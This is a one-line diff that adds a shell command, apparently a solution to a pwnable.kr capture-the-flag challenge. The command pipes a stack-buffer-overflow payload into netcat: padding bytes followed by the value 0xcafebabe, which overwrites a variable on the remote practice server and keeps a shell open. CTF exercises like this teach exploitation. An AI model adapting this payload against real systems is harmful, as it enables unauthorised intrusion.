@@ -1,0 +1,1 @@
+(python -c "print 'A'*(32 + 10*2) + '\xbe\xba\xfe\xca'" ; cat) | nc pwnable.kr 9000
